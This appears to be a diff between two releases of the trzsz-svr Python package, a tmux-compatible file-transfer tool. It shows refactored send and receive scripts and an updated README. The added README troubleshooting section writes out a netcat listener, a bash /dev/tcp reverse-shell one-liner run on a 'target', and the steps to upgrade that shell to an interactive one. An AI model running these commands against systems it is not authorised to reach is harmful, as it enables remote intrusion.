+    args = parse_args(sys.argv[1:])
+    dest_path = utils.convert_to_unicode(os.path.abspath(args.path))
 
     try:
-        check_path_writable(dest_path)
-    except TrzszError as e:
-        sys.stderr.write(str(e) + '\n')
+        utils.check_path_writable(dest_path)
+    except utils.TrzszError as ex:
+        sys.stderr.write(str(ex) + '\n')
         return
 
-    tmux_mode = check_tmux()
-    if args.binary and tmux_mode != NO_TMUX:
+    tmux_mode = utils.check_tmux()
+    if args.binary and tmux_mode != utils.NO_TMUX_MODE:
         # 1. In tmux 1.8 normal mode, supports binary upload actually. But it's old version.
         # 2. In tmux 3.0a normal mode, tmux always runs with a UTF-8 locale for input.
         #    Tmux will convert binary data to UTF-8 encoding, and no option to change it.
         #    Try to convert the UTF-8 encoding data back to original, but fails in some case.
         #    Besides, don't know how to detect the input encoding of the running tmux version.
         #    See LC_CTYPE in tmux manual: https://man7.org/linux/man-pages/man1/tmux.1.html
         # 3. In tmux control mode, iTerm2 will ignore invisible characters, or something else.
         #    While sending the binary data, iTerm2 doesn't send 'send-keys' commands to tmux.
         sys.stdout.write('Binary upload in tmux is not supported, auto switch to base64 mode.\n')
         args.binary = False
-    if args.binary and is_windows:
+    if args.binary and utils.IS_RUNNING_ON_WINDOWS:
         sys.stdout.write('Binary upload on Windows is not supported, auto switch to base64 mode.\n')
         args.binary = False
 
-    unique_id = str(int(time.time() * 1000 % 10e10))
-    if is_windows:
-        enable_virtual_terminal()
-        setup_console_output()
-        unique_id += '10'
-    elif tmux_mode == TMUX_NORMAL_MODE:
-        sys.stdout.write('\n\n\x1b[2A\x1b[0J' if 0 < get_columns() < 40 else '\n\x1b[1A\x1b[0J')
-        unique_id += '20'
-    else:
-        unique_id += '00'
+    unique_id = int(time.time() * 1000 % 10e10) * 100
+    if utils.IS_RUNNING_ON_WINDOWS:
+        utils.enable_virtual_terminal()
+        utils.setup_console_output()
+        unique_id += 10
+    elif tmux_mode == utils.TMUX_NORMAL_MODE:
+        sys.stdout.write('\n\n\x1b[2A\x1b[0J' if 0 < utils.get_columns() < 40 else '\n\x1b[1A\x1b[0J')
+        unique_id += 20
 
     mode = 'D' if args.directory else 'R'
-    sys.stdout.write('\x1b7\x07::TRZSZ:TRANSFER:%s:%s:%s\r\n' % (mode, __version__, unique_id))
+    sys.stdout.write('\x1b7\x07::TRZSZ:TRANSFER:%s:%s:%013d\r\n' % (mode, __version__, unique_id))
     sys.stdout.flush()
 
     try:
-        set_stdin_raw()
-        reconfigure_stdin()
-
-        action = recv_action()
-
-        if not action.get('confirm', False):
-            server_exit('Cancelled')
-            return
-
-        # check if the client doesn't support binary mode
-        if args.binary and action.get('binary') is False:
-            args.binary = False
-        # check if the client doesn't support transfer directory
-        if args.directory and action.get('support_dir') is not True:
-            raise TrzszError("The client doesn't support transfer directory", trace=False)
-
-        send_config(args, get_escape_chars(args.escape))
+        utils.set_stdin_raw()
+        utils.reconfigure_stdin()
 
-        local_list = recv_files(dest_path, None)
+        recv_files(args, dest_path)
 
-        _ = recv_exit()
-        server_exit('Received %s to %s' % (', '.join(local_list), dest_path))
+    except Exception as ex:
+        transfer.server_error(ex)
 
-    except Exception as e:
-        server_error(e)
 
 if __name__ == '__main__':
     main()
```

### Comparing `trzsz-svr-1.1.2/trzsz/svr/send.py` & `trzsz-svr-1.1.3/svr-tests/trzsz/svr/send.py`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 # MIT License
 #
-# Copyright (c) 2022 Lonny Wong
+# Copyright (c) 2023 Lonny Wong <lonnywong@qq.com>
 #
 # Permission is hereby granted, free of charge, to any person obtaining a copy
 # of this software and associated documentation files (the "Software"), to deal
 # in the Software without restriction, including without limitation the rights
 # to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
@@ -19,96 +19,109 @@
 # LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
 import sys
 import time
 import argparse
-from trzsz.libs.utils import *
+from trzsz.libs import utils
+from trzsz.libs import transfer
 from trzsz.svr.__version__ import __version__
 
-def main():
+
+def parse_args(sys_args):
     parser = argparse.ArgumentParser(description='Send file(s), similar to sz and compatible with tmux.',
                                      formatter_class=argparse.RawTextHelpFormatter)
     parser.add_argument('-v', '--version', action='version', version='%(prog)s (trzsz) py ' + __version__)
     parser.add_argument('-q', '--quiet', action='store_true', help='quiet (hide progress bar)')
     parser.add_argument('-y', '--overwrite', action='store_true', help='yes, overwrite existing file(s)')
     parser.add_argument('-b', '--binary', action='store_true', help='binary transfer mode, faster for binary files')
     parser.add_argument('-e', '--escape', action='store_true', help='escape all known control characters')
     parser.add_argument('-d', '--directory', action='store_true', help='transfer directories and files')
+    parser.add_argument('-r', '--recursive', action='store_true', help='transfer directories and files, same as -d')
     parser.add_argument('-B',
                         '--bufsize',
                         min_size='1K',
                         max_size='1G',
                         default='10M',
-                        action=BufferSizeParser,
+                        action=utils.BufferSizeParser,
                         metavar='N',
                         help='max buffer chunk size (1K<=N<=1G). (default: 10M)')
     parser.add_argument('-t',
                         '--timeout',
                         type=int,
                         default=20,
                         metavar='N',
                         help='timeout ( N seconds ) for each buffer chunk.\nN <= 0 means never timeout. (default: 20)')
-    parser.add_argument('file', nargs='+', type=convert_to_unicode, help='file(s) to be sent')
-    args = parser.parse_args()
+    parser.add_argument('file', nargs='+', type=utils.convert_to_unicode, help='file(s) to be sent')
+    args = parser.parse_args(sys_args)
+    if args.recursive is True:
+        args.directory = True
+    return args
+
+
+def send_files(args, file_list):
+    action = transfer.recv_action()
+
+    if not action.get('confirm', False):
+        transfer.server_exit('Cancelled')
+        return
+
+    # check if the client doesn't support binary mode
+    if args.binary and action.get('binary') is False:
+        args.binary = False
+    # check if the client doesn't support transfer directory
+    if args.directory and action.get('support_dir') is not True:
+        raise utils.TrzszError("The client doesn't support transfer directory", trace=False)
+
+    transfer.send_config(args, action, [])
+
+    transfer.send_files(file_list, None)
+
+    transfer.server_exit(transfer.recv_exit())
+
+
+def main():
+    args = parse_args(sys.argv[1:])
 
     try:
-        file_list = check_paths_readable(args.file, args.directory)
+        file_list = utils.check_paths_readable(args.file, args.directory)
         if args.overwrite:
-            check_duplicate_names(file_list)
-    except TrzszError as e:
-        sys.stderr.write(str(e) + '\n')
+            utils.check_duplicate_names(file_list)
+    except utils.TrzszError as ex:
+        sys.stderr.write(str(ex) + '\n')
         return
 
-    tmux_mode = check_tmux()
-    if args.binary and tmux_mode == TMUX_CONTROL_MODE:
+    tmux_mode = utils.check_tmux()
+    if args.binary and tmux_mode == utils.TMUX_CONTROL_MODE:
         # 1. In tmux control mode, tmux will convert some invisible characters to Octal text.
         #    E.g., tmux will convert ascii '\0' to text "\000", which from 1 byte to 4 bytes.
         # 2. Got some junk data from stdin in tmux control mode, e.g. '[?1;2c', don't know why.
         sys.stdout.write('Binary download in tmux control mode is slower, auto switch to base64 mode.\n')
         args.binary = False
-    if args.binary and is_windows:
+    if args.binary and utils.IS_RUNNING_ON_WINDOWS:
         sys.stdout.write('Binary download on Windows is not supported, auto switch to base64 mode.\n')
         args.binary = False
 
-    unique_id = str(int(time.time() * 1000 % 10e10))
-    if is_windows:
-        enable_virtual_terminal()
-        setup_console_output()
-        unique_id += '10'
-    elif tmux_mode == TMUX_NORMAL_MODE:
-        sys.stdout.write('\n\n\x1b[2A\x1b[0J' if 0 < get_columns() < 40 else '\n\x1b[1A\x1b[0J')
-        unique_id += '20'
-    else:
-        unique_id += '00'
-    sys.stdout.write('\x1b7\x07::TRZSZ:TRANSFER:S:%s:%s\r\n' % (__version__, unique_id))
+    unique_id = int(time.time() * 1000 % 10e10) * 100
+    if utils.IS_RUNNING_ON_WINDOWS:
+        utils.enable_virtual_terminal()
+        utils.setup_console_output()
+        unique_id += 10
+    elif tmux_mode == utils.TMUX_NORMAL_MODE:
+        sys.stdout.write('\n\n\x1b[2A\x1b[0J' if 0 < utils.get_columns() < 40 else '\n\x1b[1A\x1b[0J')
+        unique_id += 20
+    sys.stdout.write('\x1b7\x07::TRZSZ:TRANSFER:S:%s:%013d\r\n' % (__version__, unique_id))
     sys.stdout.flush()
 
     try:
-        set_stdin_raw()
-        reconfigure_stdin()
-
-        action = recv_action()
-
-        if not action.get('confirm', False):
-            server_exit('Cancelled')
-            return
-
-        # check if the client doesn't support binary mode
-        if args.binary and action.get('binary') is False:
-            args.binary = False
-        # check if the client doesn't support transfer directory
-        if args.directory and action.get('support_dir') is not True:
-            raise TrzszError("The client doesn't support transfer directory", trace=False)
-
-        send_config(args, [])
+        utils.set_stdin_raw()
+        utils.reconfigure_stdin()
 
-        send_files(file_list, None)
+        send_files(args, file_list)
 
-        server_exit(recv_exit())
+    except Exception as ex:
+        transfer.server_error(ex)
 
-    except Exception as e:
-        server_error(e)
 
 if __name__ == '__main__':
     main()
```

### Comparing `trzsz-svr-1.1.2/trzsz_svr.egg-info/PKG-INFO` & `trzsz-svr-1.1.3/trzsz_svr.egg-info/PKG-INFO`

 * *Files 17% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: trzsz-svr
-Version: 1.1.2
+Version: 1.1.3
 Summary: trzsz is a simple file transfer tools, similar to lrzsz ( rz / sz ) and compatible with tmux, which works with iTerm2 and has a nice progress bar.
 Home-page: https://trzsz.github.io
 Author: Lonny Wong
 Author-email: lonnywong@qq.com
 License: MIT License
 Keywords: trzsz trz tsz lrzsz rz sz tmux iTerm2 progressbar
 Classifier: Development Status :: 5 - Production/Stable
@@ -30,170 +30,201 @@
 
 Website: [https://trzsz.github.io](https://trzsz.github.io)
 
 [![MIT License](https://img.shields.io/badge/license-MIT-green.svg?style=flat)](https://choosealicense.com/licenses/mit/)
 [![PyPI trzsz](https://img.shields.io/pypi/v/trzsz?style=flat)](https://pypi.python.org/pypi/trzsz/)
 [![中文网站](https://img.shields.io/badge/%E4%B8%AD%E6%96%87-%E7%BD%91%E7%AB%99-blue?style=flat)](https://trzsz.github.io/cn/)
 
-
 ## Why?
 
 Considering `laptop -> hostA -> hostB -> docker -> tmux`, using `scp` or `sftp` is inconvenience.
 
 In this case, `lrzsz` ( rz / sz ) is convenient to use, but unfortunately it's not compatible with `tmux`.
 
 `tmux` is not going to support rz / sz ( [906](https://github.com/tmux/tmux/issues/906), [1439](https://github.com/tmux/tmux/issues/1439) ), and creating a new tools is much easier than patching `tmux`.
 
-
 ## Advantage
 
-* Support **tmux**, including tmux normal mode, and tmux command mode integrated with iTerm2.
-* Support **transfer directories**, `trz -d` to upload directories, `tsz -d xxx` to download xxx directories.
-* Support **Windows server**, not only can run on Windows client, but also can run on Windows ssh server.
-* Support **native terminal**, does not require terminal to support, just use `trzsz ssh x.x.x.x` to login.
-* Support **web terminal**, transfer files and directories between local and remote servers over the web.
-* Support **drag to upload**, drag and drop files and directories to the terminal to upload to the remote server.
-* Support **progress bar**, shows the current transferring file name, progress, size, speed, remaining time, etc.
-* Better **interactive experience**, shows the transfer results or errors friendly, `ctrl + c` to stop gracefully.
-
+- Support **tmux**, including tmux normal mode, and tmux command mode integrated with iTerm2.
+- Support **transfer directories**, `trz -d` to upload directories, `tsz -d xxx` to download xxx directories.
+- Support **Windows server**, not only can run on Windows client, but also can run on Windows ssh server.
+- Support **native terminal**, does not require terminal to support, just use `trzsz ssh x.x.x.x` to login.
+- Support **web terminal**, transfer files and directories between local and remote servers over the web.
+- Support **drag to upload**, drag and drop files and directories to the terminal to upload to the remote server.
+- Support **progress bar**, shows the current transferring file name, progress, size, speed, remaining time, etc.
+- Better **interactive experience**, shows the transfer results or errors friendly, `ctrl + c` to stop gracefully.
 
 ## Installation
 
 ### On the server
 
-* with Python3
+- Install [the Go version](https://github.com/trzsz/trzsz-go) ( ⭐ Recommended )
+
+  Please check the Go version installation guide: [https://github.com/trzsz/trzsz-go#installation](https://github.com/trzsz/trzsz-go#installation)
+
+- Or install with Python3
+
   ```
   sudo python3 -m pip install --upgrade trzsz
   ```
 
-* with Python2
+- Or install with Python2
+
   ```
   sudo python2 -m pip install --upgrade trzsz
   ```
 
-* with Homebrew
+- Or install with Homebrew
+
   ```
   brew update
   brew install trzsz
   ```
 
-* with Node.js
+- Or install with Node.js
   ```
   sudo npm install -g trzsz
   ```
 
-* or install trzsz written in Go
-
-  Check [https://github.com/trzsz/trzsz-go](https://github.com/trzsz/trzsz-go)
-
-
 &nbsp;&nbsp;Can be installed without `sudo`, just add the installation path ( e.g. `~/.local/bin` ) to the `PATH` environment.
 
-
 ### Supported Terminals
 
-* [iTerm2](https://iterm2.com/) -- check [the trzsz-iterm2 installation](https://trzsz.github.io/iterm2).
+- [trzsz-ssh](https://github.com/trzsz/trzsz-ssh) ( tssh ) -- simple ssh client with trzsz support ( ⭐ Recommended ).
 
-* [tabby](https://tabby.sh/) -- install the [tabby-trzsz](https://github.com/trzsz/tabby-trzsz) plugin.
+- [iTerm2](https://iterm2.com/) -- check [the trzsz-iterm2 installation](https://trzsz.github.io/iterm2).
 
-* [electerm](https://electerm.github.io/electerm/) -- upgrade to `1.19.0` or higher.
+- [tabby](https://tabby.sh/) -- install the [tabby-trzsz](https://github.com/trzsz/tabby-trzsz) plugin.
 
-* [ttyd](https://github.com/tsl0922/ttyd) -- upgrade to `1.7.3` or higher, and start with `-t enableTrzsz=true`, use `https` unless localhost.
+- [electerm](https://electerm.github.io/electerm/) -- upgrade to `1.19.0` or higher.
 
-* [trzsz-go](https://github.com/trzsz/trzsz-go) -- supports all terminals that support a local shell.
+- [ttyd](https://github.com/tsl0922/ttyd) -- upgrade to `1.7.3` or higher, and start with `-t enableTrzsz=true`, use `https` unless localhost.
 
-* [trzsz.js](https://github.com/trzsz/trzsz.js) -- making webshell in browser and electron terminal supports `trzsz`.
+- [trzsz-go](https://github.com/trzsz/trzsz-go) -- supports all terminals that support a local shell.
 
-&nbsp;&nbsp;*Does your terminal supports `trzsz` as well? Please let me know. I would love to have it on the list.*
+- [trzsz.js](https://github.com/trzsz/trzsz.js) -- making webshell in browser and electron terminal supports `trzsz`.
 
+&nbsp;&nbsp;_Does your terminal supports `trzsz` as well? Please let me know. I would love to have it on the list._
 
 ## Trzsz Manual
 
 #### `trz` upload files to the remote server
-  ```
-  usage: trz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] [path]
 
-  Receive file(s), similar to rz and compatible with tmux.
+```
+usage: trz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] [path]
 
-  positional arguments:
-    path               path to save file(s). (default: current directory)
+Receive file(s), similar to rz and compatible with tmux.
 
-  optional arguments:
-    -h, --help         show this help message and exit
-    -v, --version      show program's version number and exit
-    -q, --quiet        quiet (hide progress bar)
-    -y, --overwrite    yes, overwrite existing file(s)
-    -b, --binary       binary transfer mode, faster for binary files
-    -e, --escape       escape all known control characters
-    -d, --directory    transfer directories and files
-    -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
-    -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
-                       N <= 0 means never timeout. (default: 20)
-  ```
+positional arguments:
+  path               path to save file(s). (default: current directory)
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -v, --version      show program's version number and exit
+  -q, --quiet        quiet (hide progress bar)
+  -y, --overwrite    yes, overwrite existing file(s)
+  -b, --binary       binary transfer mode, faster for binary files
+  -e, --escape       escape all known control characters
+  -d, --directory    transfer directories and files
+  -r, --recursive    transfer directories and files, same as -d
+  -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
+  -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
+                     N <= 0 means never timeout. (default: 20)
+```
 
 #### `tsz` download files from the remote server
-  ```
-  usage: tsz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] file [file ...]
 
-  Send file(s), similar to sz and compatible with tmux.
+```
+usage: tsz [-h] [-v] [-q] [-y] [-b] [-e] [-d] [-B N] [-t N] file [file ...]
 
-  positional arguments:
-    file               file(s) to be sent
+Send file(s), similar to sz and compatible with tmux.
 
-  optional arguments:
-    -h, --help         show this help message and exit
-    -v, --version      show program's version number and exit
-    -q, --quiet        quiet (hide progress bar)
-    -y, --overwrite    yes, overwrite existing file(s)
-    -b, --binary       binary transfer mode, faster for binary files
-    -e, --escape       escape all known control characters
-    -d, --directory    transfer directories and files
-    -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
-    -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
-                       N <= 0 means never timeout. (default: 20)
-  ```
+positional arguments:
+  file               file(s) to be sent
+
+optional arguments:
+  -h, --help         show this help message and exit
+  -v, --version      show program's version number and exit
+  -q, --quiet        quiet (hide progress bar)
+  -y, --overwrite    yes, overwrite existing file(s)
+  -b, --binary       binary transfer mode, faster for binary files
+  -e, --escape       escape all known control characters
+  -d, --directory    transfer directories and files
+  -r, --recursive    transfer directories and files, same as -d
+  -B N, --bufsize N  max buffer chunk size (1K<=N<=1G). (default: 10M)
+  -t N, --timeout N  timeout ( N seconds ) for each buffer chunk.
+                     N <= 0 means never timeout. (default: 20)
+```
 
 #### Trouble shooting
-* If `tmux` is not running on the remote server, but on the local computer, or on a middle server.
-  * Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
-  * Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the local computer, and `alias ssh="trzsz ssh"` for convenience.
-
-* If an error occurs, and `trzsz` is hanging up.
-  * Press `control + c` to stop `trz` or `tsz` process on the server.
-  * For iTerm2 users, press `command + option + shift + r` to stop [iTerm2 Coprocesses](https://iterm2.com/documentation-coprocesses.html).
 
-* If `trz -b` binary upload fails, and login to server using `telnet` or `docker exec`.
-  * Try to escape all known control characters, e.g., `trz -eb`.
+- If `tmux` is running on the local computer.
+
+  - Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
+  - Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the local computer, use `trzsz ssh` to login after `tmux`.
+
+- If `tmux` is running on the jump server.
+
+  - Option 1: Use `tmux -CC` integration with iTerm2, please refer to [iTerm2 tmux Integration](https://trzsz.github.io/tmuxcc).
+  - Option 2: Install [trzsz-go](https://github.com/trzsz/trzsz-go) on the jump server, use `trzsz -r ssh` to login after `tmux`.
+
+- If an error occurs, and `trzsz` is hanging up.
+
+  - Press `control + c` to stop `trz` or `tsz` process on the server.
+  - For iTerm2 users, press `command + option + shift + r` to stop [iTerm2 Coprocesses](https://iterm2.com/documentation-coprocesses.html).
+
+- If `trz -b` binary upload fails, and login to server using `telnet` or `docker exec`.
+
+  - Try to escape all known control characters, e.g., `trz -eb`.
 
-* If `trz -b` or `tsz -b` binary transfer fails, and login to server using `expect`.
-  * Try to `export LC_CTYPE=C` before the `expect` script. e.g.:
+- If `trz -b` or `tsz -b` binary transfer fails, and login to server using `expect`.
+
+  - Try to `export LC_CTYPE=C` before the `expect` script. e.g.:
     ```
     #!/bin/sh
     export LC_CTYPE=C
     expect -c '
       spawn ssh xxx
       expect "xxx: "
       send "xxx\n"
       interact
     '
     ```
 
+- If you want to upload and download using `trz / tsz` in a reverse shell, you need to follow these steps:
+
+  - 1\. Use `tssh xxx` or `trzsz ssh xxx` to log in to the server.
+  - 2\. Execute `nc -lnv 1337` on the server, and wait for the reverse shell connection.
+  - 3\. Reverse connect to the server on the target, such as `bash -i >& /dev/tcp/192.168.0.1/1337 0>&1`.
+  - 4\. Follow these steps in the reverse shell:
+    - 4.1. Convert to an interactive shell, such as `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
+    - 4.2. Press `ctrl + z` to turn the reverse shell into background.
+    - 4.3. Execute `stty raw -echo; fg` to disable the echo of the server, and return to the reverse shell.
+    - 4.4. Press the Enter key, and the command line prompt will be displayed.
+    - 4.5. Set the terminal environment variable `export TERM=xterm-256color` ( not necessary ).
+    - 4.6. Check if there is a `TMUX` environment variable, clear it with `unset TMUX`.
+    - 4.7. Now you can use `trz / tsz` to upload and download as normal.
+  - 5\. After exiting the interactive shell, there will be no echo, type `exit` blindly to exit the reverse shell.
+  - 6\. Type `reset` blindly on the server and press Enter to reset the default settings of the terminal.
+
 ## Screenshot
 
 #### Using trzsz in iTerm2 with `text` progress bar
 
-  ![using trzsz in iTerm2 with text progress bar](https://trzsz.github.io/images/iterm2_text.gif)
-
+![using trzsz in iTerm2 with text progress bar](https://trzsz.github.io/images/iterm2_text.gif)
 
 #### Using trzsz in iTerm2 with `zenity` progress bar
 
-  ![using trzsz in iTerm2 with zenity progress bar](https://trzsz.github.io/images/iterm2_zenity.gif)
-
+![using trzsz in iTerm2 with zenity progress bar](https://trzsz.github.io/images/iterm2_zenity.gif)
 
 #### Using trzsz in tabby with `tabby-trzsz` plugin
 
-  ![using trzsz in tabby with tabby-trzsz plugin](https://trzsz.github.io/images/tabby_trzsz.gif)
-
+![using trzsz in tabby with tabby-trzsz plugin](https://trzsz.github.io/images/tabby_trzsz.gif)
 
 ## Contact
 
-Feel free to email me <lonnywong@qq.com>.
+Feel free to email the author <lonnywong@qq.com>. Welcome to join the QQ group: 318578930.
+
+Want to buy the author a drink 🍺 ?
+
+![sponsor wechat qrcode](https://trzsz.github.io/images/sponsor_wechat.jpg)
+![sponsor alipay qrcode](https://trzsz.github.io/images/sponsor_alipay.jpg)
```

